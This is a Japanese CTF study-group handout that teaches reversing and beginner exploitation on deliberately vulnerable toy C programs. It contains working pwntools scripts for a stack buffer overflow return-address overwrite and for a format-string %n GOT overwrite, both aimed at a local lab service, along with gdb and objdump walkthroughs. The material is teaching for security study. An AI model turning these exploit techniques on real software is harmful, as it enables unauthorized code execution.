# CTF分科会第４回資料

　課題・試験があって（とはいえ数理工学レポート提出に失敗した）、あまりCryptoの方で話ができなさそうだったので、今回は小休止ということで簡単なPwn問題について見ていくことにする。

## Reversing入門

　まず、今後Reversing、という時には基本的に「ELFバイナリのReversing」をさしている。ELFバイナリというのは、Linuxの実行可能ファイルのファイルフォーマットのことで、gccなどで適当にコンパイルした場合の生成物はこの形式になっている。


## 例: Simple Echo Program

多分もっとも簡単なpwnっぽい問題の一つだと思うものを例に、Rev/Pwnの流れについて見る。

```c
#include <stdio.h>
#include <stdlib.h>

void binsh() {
    system("/bin/sh");
}

// Simple Echo Program
int main(void) {
    char dump[101];

    while(1) {
        scanf("%100s", dump);
        printf(dump);
        printf("\n--------\n");
    }
    return 0;
}
```

このプログラムには自明な脆弱性がある。簡単のため、/bin/shを呼び出す関数を自前で作っておいたので、この関数をどうにかして呼び出せないか？


## 解析

　今回、すでにプログラムを上記のように表示してしまったが、普通はコンパイルされて実行可能なバイナリ（いわゆる機械語）の状態になっているものを解析する必要がある。
　世の中には、変態的な人間がいて、ELFの構造を完全に理解し、機械語状態でもある程度読める人はいるかもしれないが、基本的には、機械語をいわゆる人間の読める形である「アセンブリ」に変換するディスアセンブルという走査を行い、静的な解析を行う。
　いわゆるアセンブリ言語というものがわからないといけないのか、と思うかもしれないが、アセンブリ言語は割と覚えることが少なく、読むのに時間がかかるかもしれないが、読んでいくことである程度慣れてくる部分があると思う。
　ディスアセンブルするツールとしては、さっきあげた、objdump/IDA/Hopperなどがあるが、今回は、プログラムが単純なこともあり、objdumpで行うことにする。

### objdumpによる解析

ディスアセンブルするためには以下のようにコマンドを打つ

```
$ objdump -d -M intel vuln
```
なお、vulnは実行ファイルの名前である（ので好きなファイルの名前を使う）。

今回のプログラムのディスアセンブル結果は次のようになった。

```
0000000100000ef0 <_binsh>:
   100000ef0:	55                   	push   rbp
   100000ef1:	48 89 e5             	mov    rbp,rsp
   100000ef4:	48 83 ec 10          	sub    rsp,0x10
   100000ef8:	48 8d 3d 9f 00 00 00 	lea    rdi,[rip+0x9f]        # 100000f9e <_main+0x8e>
   100000eff:	e8 64 00 00 00       	call   100000f68 <_main+0x58>
   100000f04:	89 45 fc             	mov    DWORD PTR [rbp-0x4],eax
   100000f07:	48 83 c4 10          	add    rsp,0x10
   100000f0b:	5d                   	pop    rbp
   100000f0c:	c3                   	ret
   100000f0d:	0f 1f 00             	nop    DWORD PTR [rax]

0000000100000f10 <_main>:
   100000f10:	55                   	push   rbp
   100000f11:	48 89 e5             	mov    rbp,rsp
   100000f14:	48 81 ec 80 00 00 00 	sub    rsp,0x80
   100000f1b:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
   100000f22:	48 8d 3d 7d 00 00 00 	lea    rdi,[rip+0x7d]        # 100000fa6 <_main+0x96>
   100000f29:	48 8d 75 90          	lea    rsi,[rbp-0x70]
   100000f2d:	b0 00                	mov    al,0x0
   100000f2f:	e8 2e 00 00 00       	call   100000f62 <_main+0x52>
   100000f34:	48 8d 7d 90          	lea    rdi,[rbp-0x70]
   100000f38:	89 45 8c             	mov    DWORD PTR [rbp-0x74],eax
   100000f3b:	b0 00                	mov    al,0x0
   100000f3d:	e8 1a 00 00 00       	call   100000f5c <_main+0x4c>
   100000f42:	48 8d 3d 63 00 00 00 	lea    rdi,[rip+0x63]        # 100000fac <_main+0x9c>
   100000f49:	89 45 88             	mov    DWORD PTR [rbp-0x78],eax
   100000f4c:	b0 00                	mov    al,0x0
   100000f4e:	e8 09 00 00 00       	call   100000f5c <_main+0x4c>
   100000f53:	89 45 84             	mov    DWORD PTR [rbp-0x7c],eax
   100000f56:	e9 c7 ff ff ff       	jmp    100000f22 <_main+0x12>
```
### レジスタ

#### rip


### 命令群

ここで、現れるアセンブリの命令について大雑把なC言語的な疑似コードを書いた表が次である。イメージであって、0fillされたり、見える部分以外に変更が加わる可能性(subとか特に）があったりするので、正確な内容は他を参照したほうがいい。

| 命令名 | C言語的コード| 補足|
|:-----:|:------||
|mov A B|A = B  ||
|add A B|A += B ||
|sub A B|A -= B |比較の際などには注意|
|jmp A  |goto A(Aにジャンプする)||
|push A |*stack = A; stack--|いわゆるスタック構造のpush|
|pop A  |A = *stack; stack ++|
|lea A [B+0x10]| A = B+0x10 ||
|call A| A()|いわゆる関数呼び出し（後述）|
|ret | return|いわゆるreturn（後述）|
|nop| | なにもしない|


まぁしかし、いきなり全部アセンブリ読むのはどう考えてもきついので、今回はコンパイル前のソースコードと比較しながら見て行くと少しずつ分かるようになっていくと思われる。


## 脆弱性について

　今回は二つの有名な脆弱性があるプログラムを見て行くことにする。


### バッファ オーバー フロー(bof)

```
#include <stdio.h>
#include <stdlib.h>

void shell() {
    puts("Can you see me?");
    system("/bin/sh");
}

int main(void) {
    char name[100];
    printf("**Greeting service**\nWhat's your name: ");
    fflush(stdout);
    gets(name);
    printf("Hello, %s\n", name);
    fflush(stdout);
    return 0;
}
```

このプログラムには、自明な脆弱性がある。なんだろうか？まずは、実行してみる。

```
vagrant@sig-ctf-2017:~/shared-folder/problems/echo2$ ./echo2
**Greeting service**
What's your name: moratorium08
Hello, moratorium08
vagrant@sig-ctf-2017:~/shared-folder/problems/echo2$ ./echo2
**Greeting service**
What's your name: %x
Hello, %x
```
一見すると特に何もなくプログラムが終了しているようである。では、ここで、200文字くらいの長さの文字列を入力してみる。

```
vagrant@sig-ctf-2017:~/shared-folder/problems/echo2$ python -c "print 'A' * 200" | ./echo2
**Greeting service**
What's your name: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

セグフォが出た。何が起きているのかを、gdbを使って確認してみる。


```
vagrant@sig-ctf-2017:~/shared-folder/problems/echo2$ gdb -q ./echo2
Reading symbols from ./echo2...(no debugging symbols found)...done.
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0804851d <+0>:	push   ebp
   0x0804851e <+1>:	mov    ebp,esp
   0x08048520 <+3>:	and    esp,0xfffffff0
   0x08048523 <+6>:	add    esp,0xffffff80
   0x08048526 <+9>:	mov    DWORD PTR [esp],0x8048628
   0x0804852d <+16>:	call   0x8048390 <printf@plt>
   0x08048532 <+21>:	mov    eax,ds:0x804a040
   0x08048537 <+26>:	mov    DWORD PTR [esp],eax
   0x0804853a <+29>:	call   0x80483a0 <fflush@plt>
   0x0804853f <+34>:	lea    eax,[esp+0x1c]
   0x08048543 <+38>:	mov    DWORD PTR [esp],eax
   0x08048546 <+41>:	call   0x80483b0 <gets@plt>
   0x0804854b <+46>:	lea    eax,[esp+0x1c]
   0x0804854f <+50>:	mov    DWORD PTR [esp+0x4],eax
   0x08048553 <+54>:	mov    DWORD PTR [esp],0x8048650
   0x0804855a <+61>:	call   0x8048390 <printf@plt>
   0x0804855f <+66>:	mov    eax,ds:0x804a040
   0x08048564 <+71>:	mov    DWORD PTR [esp],eax
   0x08048567 <+74>:	call   0x80483a0 <fflush@plt>
   0x0804856c <+79>:	mov    eax,0x0
   0x08048571 <+84>:	leave
   0x08048572 <+85>:	ret
End of assembler dump.
gdb-peda$ b main
Breakpoint 1 at 0x8048520
gdb-peda$ b *0x0804856c
Breakpoint 2 at 0x804856c
```


![gdb1](https://lh3.googleusercontent.com/-FWLxOtwWBtg/WSehnfoL_nI/AAAAAAAAM8k/fobBS1GNIKwjza39kGXO_D5iJA-vhjHEACLcB/s0/%25E3%2582%25B9%25E3%2582%25AF%25E3%2583%25AA%25E3%2583%25BC%25E3%2583%25B3%25E3%2582%25B7%25E3%2583%25A7%25E3%2583%2583%25E3%2583%2588+2017-05-26+12.31.12.png "gdb1.png")

ブレークポイントを二つ仕掛けてから```run```で実行をする。

![gdb2](https://lh3.googleusercontent.com/-ECfotd8ulA8/WSeh6VozfNI/AAAAAAAAM8s/lEzPD8lExwYq2RKZbbAF0f61aWDTEWJogCLcB/s0/%25E3%2582%25B9%25E3%2582%25AF%25E3%2583%25AA%25E3%2583%25BC%25E3%2583%25B3%25E3%2582%25B7%25E3%2583%25A7%25E3%2583%2583%25E3%2583%2588+2017-05-26+12.32.27.png "gdb2.png")

すると、一つ目のブレークポイントで実行がとりあえず停止する。この段階におけるスタックの状態を見てみる。


![gdb3](https://lh3.googleusercontent.com/-EYFvHs1p_lQ/WSeiSA3ymxI/AAAAAAAAM80/cmn_2xwoW1U3Pqpg9pcnFgK3Andk2FCfACLcB/s0/%25E3%2582%25B9%25E3%2582%25AF%25E3%2583%25AA%25E3%2583%25BC%25E3%2583%25B3%25E3%2582%25B7%25E3%2583%25A7%25E3%2583%2583%25E3%2583%2588+2017-05-26+12.33.53.png "gdb3.png")

すなわち関数では、引数、リターンアドレス、元の関数におけるebpを順にスタックにpushする。これは、このmain関数が終わったあと、処理をただしく戻すために行われるのだが、逆に言えばこの値を書き換えることができれば、処理を乗っ取る（eipを取る）ことができる。続けるには```c```と押してエンターを押す。ここで、先ほどでかい入力で結果が壊れることを確認したのである程度大きな入力を、```name```として入力する。

![gdb5](https://lh3.googleusercontent.com/-CwgMhMLKKQc/WSekjpadMoI/AAAAAAAAM9Q/RDeOUIOcZp83T0vmuqpoyJ6F7GXyQILigCLcB/s0/%25E3%2582%25B9%25E3%2582%25AF%25E3%2583%25AA%25E3%2583%25BC%25E3%2583%25B3%25E3%2582%25B7%25E3%2583%25A7%25E3%2583%2583%25E3%2583%2588+2017-05-26+12.36.46.png "gdb5.png")

すると、二つ目のブレークポイントで停止するので再びスタックをのぞいて見る。

どうやら、さっきまで関数の戻りアドレスが確保されていた```0xffffd69c```の値が上書きされてしまっている。このまま実行を続けると、リターンアドレスとしてOPQRという文字列の表すアドレスにリターンしてしまい、そのような場所は権限がおかしくエラーになり次のようにinvalidと言われ実行は停止する。

![gdb6](https://lh3.googleusercontent.com/-qwRol27AKr0/WSelZdb5YpI/AAAAAAAAM9g/3dZjRJ35oLQqdbyaDphnX0mWws95iFDzACLcB/s0/%25E3%2582%25B9%25E3%2582%25AF%25E3%2583%25AA%25E3%2583%25BC%25E3%2583%25B3%25E3%2582%25B7%25E3%2583%25A7%25E3%2583%2583%25E3%2583%2588+2017-05-26+12.39.22.png "gdb6.png")

つまり、このプログラムを乗っ取るということは、この場所に「うまい」アドレスを代入しておくことで、自分の好きな実行をするように仕組む、ということにあたる。イメージは、ホワイトボードか何かでかく。

ここで、今回のプログラムでは、簡易化のためにshellという関数が事前に組まれている。ここに実行先が飛ぶように指し示すことを目指す。


### セキュリティ保護機構に関して

　実際に攻撃コードを書く前に、セキュリティ保護機構について大雑把に触れる。セキュリティ保護機構とは、プログラマが仮に脆弱性のあるコードを書いてしまっても、攻撃者が攻撃しにくくする目的でOSやコンパイラに組まれた仕組みのことである。有名（僕が知っている）なものだと次のようなものがある

* Stack Canary
* ASLR
* NX bit
* PIE
* RELRO

順番に一言くらいでイメージを書く。ネット上だと[@encry1024さんのブログ](http://pwn.hatenadiary.jp/entry/2015/12/05/195316)などにまとまっている。以下は個人的感想。

#### Stack Canary

　関数内でバッファオーバーフローを検知する。これにより愚直なスタックバッファーオーバーフローでは、Canaryが書き換わってしまい検知されるのでリークなどでCanary回避などが必要になる。

#### ASLR（アドレス空間配置のランダム化）

　特定のアドレス空間のアドレスの配置がランダムになる。例えば、Stackアドレスやヒープのアドレスなどで、これにより実行のたびに書き換えるべき場所が変化することになる。これにより、アドレスを決め打ちすることができなくなるのでベースアドレスのリークなどが必要になる。

#### NX bit

　 Windowsでいう「データ実行防止」という機構。スタックなど本来プログラムが保持されているはずがない場所にeipが飛んで実行が起こらないようになっている。これにより愚直にシェルコードを送り込んで実行する、ということはできなくなり、ROPなどによる回避が必要となる。

#### PIE(位置独立コード)
　
　ASLRではプログラムの場所は、ランダムにはならないが、PIEを有効にしてgccでコンパイルをすると、プログラムの配置自体もランダムにすることができる。これにより、今回デモをするような簡単な例でも、関数決め打ちができなくなって面倒臭くなる。ちなみに、Ubuntu17.04のgccからはPIEが標準という話をTwitterか何かで見た（要出典）。

#### RELRO

PartialやNo RELROの場合は、良いのだが、Full RELROになっていると、.got領域の書き換えが不可能になって、GOT Overwriteができなくなる（くらいのデメリットしかわからない）。


## exploitコード

　セキュリティ機構について書いたが、今回は簡易化のために、Stack Canaryを消してコンパイルを行った。

さっきまで見てきたように、どうも一定文字数後に入力された値にジャンプするようで、これはgdb見ながら解析するのでもよいがより簡易的に

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFHJIKLMNOPQRSTUVWXYZ
```

という文字の入力に対して```OPQR```がeipになったことからそれまでの文字列の長さがリターンアドレスまでのオフセットになっていると考察できる。これは112文字である。

このあとリターンアドレスを何に書き換えたいのかと言えば、shellのアドレスである。shellのアドレスは、objdumpの出力から0x80484fdである。以上より、112文字のオフセットのあとに、この関数アドレスを足した文字列を送り込む。ところで、関数アドレスはリトルエンディアンと言って([参照：エンディアン Wikipedia](https://ja.wikipedia.org/wiki/%E3%82%A8%E3%83%B3%E3%83%87%E3%82%A3%E3%82%A2%E3%83%B3#.E3.83.AA.E3.83.88.E3.83.AB.E3.82.A8.E3.83.B3.E3.83.87.E3.82.A3.E3.82.A2.E3.83.B3))、例えば4バイトの数は後ろから順番にメモリに格納される、という事実に注意する。

また、プログラムの実行に関しては本番を想定して次のように行う。

```
socat TCP-L:3000,reuseaddr,fork EXEC:./echo2
```

これにより、ポート3000にアクセスすると、サーバーとの通信をしているような形で問題を解くことができる

```
$ nc localhost 3000
**Greeting service**
What's your name: moratorium08
Hello, moratorium08
```

また、この場合、外部との通信をやりとりするには、

```
$ python -c "print('A' * 112 + '\xfd\x84\x04\x08')" > dump
$ cat dump - | nc localhost 3000
```
のようにしてもよいが、pythonのライブラリ（特にpwn用に作られたライブラリ）を使うと、細かいことを気にせずスクリプトがかけて便利である。pwntoolsというのが個人的に便利だと思っていて、

```
$ pip install pwntools
```
でインストール可能である。


```
# coding:utf-8
from pwn import remote, p32

host = "127.0.0.1"
port = 3000

r = remote(host, port)

r.recvuntil("name: ")

code = "A" * 112  # dummy
code += p32(0x80484fd)
print(code)
r.sendline(code)

r.interactive()
```

### フォーマットストリングバグ

　比較的構造が簡単で、有名な脆弱性としてスタックのBOFと双璧をなすのがフォーマットストリングバグである。これは、最初にReversingの例として提示したプログラムがそれに当たる。それを再掲する。

```c
#include <stdio.h>
#include <stdlib.h>

void binsh() {
    system("/bin/sh");
}

// Simple Echo Program
int main(void) {
    char dump[101];
    while(1) {
        fgets(dump, 100, stdin);
        printf(dump); // vuln
        fflush(stdout);
    }
    return 0;
}
```

コメントでvulnと書かれた部分が脆弱性が存在する場所である。このプログラムを実行してみてどういう挙動を示すのかを、考えてみる。実行ファイル及びプログラムの場所はshared-folder/problems/echo/である。

```
vagrant@sig-ctf-2017:~/shared-folder/problems/echo$ ./echo
hello
hello
waiwai
waiwai
```

なんの変哲もなさそうであるが、ここにフォーマット指定子を入力して見ると、何が問題かが分かると思われる。

```
vagrant@sig-ctf-2017:~/shared-folder/problems/echo$ ./echo
%x
3627a003
%x %x %x
3627a009 360569f0 78252078
```

これは何が起きているのかと言えば、%xが与えられたため、その位置に相当する値を参照するのだが、そのような値はリターンアドレスなど別の用途の為に置かれている値であり、それが流出しているのである。

これだけだと値のリークにしか使えなさそうであるが、実はフォーマット指定子によって、値を書き込むことが可能である。これは%nという指定子を用いる。これは、今までに何文字出力したのかというのを記録するために用いられる指定子（普通のプログラミングでは使ったことがないのだが）で、うまいこと文字数を出力させてそれを値に代入するようにすると、面白いことに、好きなアドレスの値を書き換えることが可能になる。

### GOT overwrite

　グローバルオフセットテーブルといわれる、動的にライブラリの絶対アドレスを実行ファイルと結びつけるためのテーブルがある（[参考](http://softwaretechnique.jp/OS_Development/Tips/ELF/elf03.html#OS_CPU_GLOBAL_OFFSET_TABLE)）。ここには、例えばprintfをプログラムが使っている場合、それに対応するアドレスが格納されるようになっている（初回実行時にロード）。これを書き換えることで、その関数を呼び出しているかのように別の関数を呼び出させることが可能になり、その攻撃方法を「GOT overwrite」という。ちなみに、さっきあげた保護機構のうちRELROがFullの場合、書き換えることができない。

　今回の実行ファイルでは、RELROが Fullでない場合を考えていきたい。なお、どのような保護機構が有効かどうかを調べるためにはchecksecというのが便利である（sig-ctf-2017の仮想環境には入るようになっている）。

```
vagrant@sig-ctf-2017:~/shared-folder/problems/echo$ checksec echo
[*] '/home/vagrant/shared-folder/problems/echo/echo'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
これを見るとわかるように、Partial RELROに今回のechoバイナリはなっている。


### Exploitコード

　今回も簡易化のために、binshという関数が用意されている。方針としては、fgetsのGOTのアドレスをbinsh関数のアドレスで上書きする。

```
gdb-peda$ disass 0x80483c0
Dump of assembler code for function fgets@plt:
   0x080483c0 <+0>:	jmp    DWORD PTR ds:0x804a014
   0x080483c6 <+6>:	push   0x10
   0x080483cb <+11>:	jmp    0x8048390
```

および、

```
gdb-peda$ disass binsh
Dump of assembler code for function binsh:
   0x080484fd <+0>:	push   ebp
   0x080484fe <+1>:	mov    ebp,esp
   0x08048500 <+3>:	sub    esp,0x18
   0x08048503 <+6>:	mov    DWORD PTR [esp],0x80485f0
   0x0804850a <+13>:	call   0x80483d0 <system@plt>
   0x0804850f <+18>:	leave
   0x08048510 <+19>:	ret
```
から、目標のアドレスがそれぞれ0x804a014と、0x080484fdであることが確認される。

しばしば、FSBはpwntoolsのようなライブラリを使って必要な攻撃コードを用意することが可能であるが、今回はそれでは味気がないし何をしているのか分からない感じになるので、自分で攻撃コードを作る。

まず次のように何番目指定子が、実際の引数に当たるのかを調べる
```
vagrant@sig-ctf-2017:~/shared-folder/problems/echo$ ./echo
%x %x %x %x %x %x
64 f77b7c20 0 ffc823a4 25c82318 78252078
```
これを見ると"%x "にあたるAsciiの値列0x25 0x78 0x20の逆順（リトルエンディアンなので）が、5番目から6番目にかけて見える。したがって、ここが起点になることが分かる。今回、特定のアドレスを4byteでアラインされた位置に置く必要がある。これは、次のように直接参照するからで、

```
vagrant@sig-ctf-2017:~/shared-folder/problems/echo$ ./echo
%6$x
78243625
```

そのために、dummyで１文字最初に出力する

```
a%x %x %x %x %x %x
a64 f77b7c20 0 ffc823a4 61c82318 25207825
```
すると、25207825(%:0x25, x:0x78, スペース:0x20なので）とちゃんとアラインされたのが分かる。

先ほども書いたが、%nというのは今までに何文字出力したのか？を特定の引数の示す先に書き込む。基本的に書き込み先の値はある程度大きいので、大きい文字列を送ると溢れてしまう。この場合printf関数の文字幅指定によって、任意の長さの文字を表示させることが可能である。

以上を加味すると以下のようなスクリプトで攻撃コードを出力可能である。詳しく文字列で書くのは割とめんどくさいのでこの部分はホワイトボードか何かで解説する。

```
# coding:utf-8
from __future__ import division
from pwn import remote

def p32(addr):
    ret = ""
    for i in range(4):
        x = addr % 256
        addr = addr // 256
        ret += chr(x)
    return ret

host = "127.0.0.1"
port = 3000
r = remote(host, port)

binsh_addr = 0x080484fd
fgets_got = 0x804a014

pos = 6

buf = "a"

for i in range(4):
    addr = fgets_got + i
    buf += p32(addr)

cnt = len(buf)
for i in range(4):
    x = binsh_addr % 256
    binsh_addr = binsh_addr // 256
    offset = (x - cnt) % 256
    buf += "%{0}c%{1}$hhn".format(offset, pos + i)
    cnt += offset
#print(buf)
r.sendline(buf)
r.interactive()
```



## リンク(TSGer)

* [去年の分科会のRev/Pwnの資料@cookies146](http://qiita.com/cookies/private/be4c39c623b5e0617740)
* [satosさんのブログ](http://satos.hatenablog.jp/entry/2016/12/02/192417)

